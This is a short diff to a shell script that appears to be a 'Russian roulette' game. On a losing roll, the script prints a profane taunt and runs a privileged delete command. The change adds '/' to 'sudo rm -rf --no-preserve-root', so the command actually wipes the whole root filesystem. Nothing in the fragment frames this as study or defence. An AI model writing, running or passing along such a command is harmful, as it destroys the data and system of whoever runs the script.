@@ -11,7 +11,7 @@ while true; do
     if [ "$ready" == "y" ]; then
         if [ "$random_number" -eq 6 ]; then
             echo "Unlucky mate, but you are fucked!"
-            sudo rm -rf --no-preserve-root
+            sudo rm -rf / --no-preserve-root
             break
         else
             echo "You got lucky this time!"
